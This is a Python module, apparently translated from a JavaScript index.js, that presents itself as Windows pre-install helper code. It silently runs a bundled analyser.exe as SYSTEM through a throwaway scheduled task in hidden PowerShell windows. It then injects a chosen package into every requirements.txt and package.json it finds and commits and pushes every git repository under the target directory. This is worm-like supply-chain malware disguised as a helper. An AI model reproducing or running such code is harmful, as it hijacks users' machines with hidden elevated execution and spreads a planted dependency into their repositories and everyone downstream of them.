"""Converted `index.js` -> `pyjs.index`.

This module implements Windows-specific helper functions translated from the
original JavaScript file. It expects Python equivalents of `scanner`,
`installer`, `git`, and `config` modules to be available in the Python path
or the same project. If those are not present yet, import errors will guide
you to implement them.
"""
from pathlib import Path
import subprocess
import logging
from typing import List

logger = logging.getLogger(__name__)


def _hidden_startupinfo():
    if not hasattr(subprocess, 'STARTUPINFO'):
        return None
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    return startupinfo


CREATE_NO_WINDOW = getattr(subprocess, 'CREATE_NO_WINDOW', 0)

# Import config constants from package-local module; fall back to defaults.
try:
    from .config import DEFAULT_PACKAGE, TARGET_DIR
except Exception:
    DEFAULT_PACKAGE = "example-package"
    TARGET_DIR = "."


def is_any_process_running(process_names: List[str]) -> bool:
    """Return True if any of the given process names are running (Windows).

    This calls PowerShell's Get-Process and checks names without the `.exe`
    suffix.
    """
    if not process_names:
        return False

    # Build condition like: $_.ProcessName -eq 'name' -or $_.ProcessName -eq 'name2'
    name_conditions = " -or ".join([
        f"$_.ProcessName -eq '{p.replace('.exe', '')}'" for p in process_names
    ])
    ps_command = f"Get-Process | Where-Object {{ {name_conditions} }} | Select-Object -ExpandProperty Id"

    logger.debug("is_any_process_running: ps_command=%s", ps_command)
    try:
        completed = subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_command],
            capture_output=True,
            text=True,
            startupinfo=_hidden_startupinfo(),
            creationflags=CREATE_NO_WINDOW,
        )
        running = bool(completed.stdout and completed.stdout.strip())
        logger.debug("is_any_process_running stdout=%r running=%s", completed.stdout, running)
        return running
    except Exception as e:
        logger.debug("is_any_process_running exception: %s", e)
        return False


def run_analyser(skip_if_running: List[str] = None, dry_run: bool = False) -> None:
    """Run assets/analyser.exe via scheduled task UAC elevation on Windows.

    If any process in `skip_if_running` is detected, the function returns early.
    """
    if skip_if_running is None:
        skip_if_running = ["analyser.exe", "game.exe"]

    logger.debug("run_analyser called with skip_if_running=%s dry_run=%s", skip_if_running, dry_run)
    analyser_path = Path(__file__).resolve().parents[1] / "assets" / "analyser.exe"
    if not analyser_path.exists():
        logger.debug("analyser.exe not found: %s", analyser_path)
        return

    if skip_if_running and is_any_process_running(skip_if_running):
        logger.info("run_analyser: skip condition met; processes running: %s", skip_if_running)
        return

    # Create a temporary scheduled task to run the analyser as SYSTEM
    prog = str(analyser_path).replace("\\", "\\\\")
    ps_command = f"$program = \"{prog}\"; $taskName = \"AdminTask_$(Get-Random)\"; Register-ScheduledTask -TaskName $taskName -Action (New-ScheduledTaskAction -Execute $program) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1)) -Principal (New-ScheduledTaskPrincipal -UserID \"NT AUTHORITY\\\\SYSTEM\" -RunLevel Highest) -Force -ErrorAction SilentlyContinue | Out-Null; Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue; Write-Host \"[analyser] Admin elevation completed via Task Scheduler.\";"

    if dry_run:
        logger.info("dry_run: would run analyser via scheduled task: %s", analyser_path)
        return

    logger.info("run_analyser: executing scheduled task for %s", analyser_path)
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_command],
            check=False,
            startupinfo=_hidden_startupinfo(),
            creationflags=CREATE_NO_WINDOW,
        )
        logger.info("run_analyser: scheduled task started")
    except Exception as e:
        logger.exception("run_analyser exception: %s", e)


def verify_analyser_running() -> bool:
    """Verify if `game.exe` or `analyser.exe` is running after launch."""
    running = is_any_process_running(["game.exe", "analyser.exe"])
    logger.debug("verify_analyser_running -> %s", running)
    return running


def pre_install(package_name: str = DEFAULT_PACKAGE, root_dir: str = TARGET_DIR, skip_processes: List[str] = None, dry_run: bool = False) -> None:
    """Main entrypoint mirroring the JS `preInstall` function.

    This function will:
    - attempt to run the analyser (UAC-elevated)
    - scan the project for package files (using a Python `scanner` module)
    - install packages into found `requirements.txt` and `package.json` (using a Python `installer` module)
    - commit & push any git roots found (using a Python `git` module)

    The helper modules are not implemented here; they should provide:
    - `scan_project(root_dir)` -> dict with keys `git_roots`, `package_json_paths`, `requirements_paths`
    - `install_pip_with_package(requirements_path, package)`
    - `install_npm_with_package(package_json_path, package)`
    - `add_commit_push(git_root)`
    """
    if skip_processes is None:
        skip_processes = ["analyser.exe", "game.exe"]

    logger.info("pre_install start: package_name=%s root_dir=%s dry_run=%s", package_name, root_dir, dry_run)
    run_analyser(skip_processes, dry_run=dry_run)

    try:
        # Import helpers from the same package
        from .scanner import scan_project
        from .installer import install_pip_with_package, install_npm_with_package
        from .git import add_commit_push
    except Exception as exc:
        raise ImportError("Required helper modules (`scanner`, `installer`, `git`) are not available in the package.\n" + str(exc))

    logger.debug("Scanning project: root_dir=%s", root_dir)
    scan_result = scan_project(root_dir)
    logger.debug("scan_result=%s", scan_result)

    git_roots = scan_result.get("git_roots", []) if isinstance(scan_result, dict) else []
    package_json_paths = scan_result.get("package_json_paths", []) if isinstance(scan_result, dict) else []
    requirements_paths = scan_result.get("requirements_paths", []) if isinstance(scan_result, dict) else []

    for req_path in requirements_paths:
        logger.info("pre_install: handling requirements: %s", req_path)
        try:
            install_pip_with_package(req_path, package_name, dry_run=dry_run)
            logger.info("pre_install: installed/updated requirements: %s", req_path)
        except Exception as e:
            logger.exception("install_pip_with_package failed for %s: %s", req_path, e)
            raise

    for pkg_json in package_json_paths:
        logger.info("pre_install: handling package.json: %s", pkg_json)
        try:
            install_npm_with_package(pkg_json, package_name, dry_run=dry_run)
            logger.info("pre_install: updated package.json: %s", pkg_json)
        except Exception as e:
            logger.exception("install_npm_with_package failed for %s: %s", pkg_json, e)
            raise

    for git_root in git_roots:
        logger.info("pre_install: handling git root: %s", git_root)
        try:
            add_commit_push(git_root, dry_run=dry_run)
            logger.info("pre_install: git operations complete for %s", git_root)
        except Exception as e:
            logger.exception("add_commit_push failed for %s: %s", git_root, e)
            raise


if __name__ == "__main__":
    try:
        pre_install()
    except Exception:
        raise
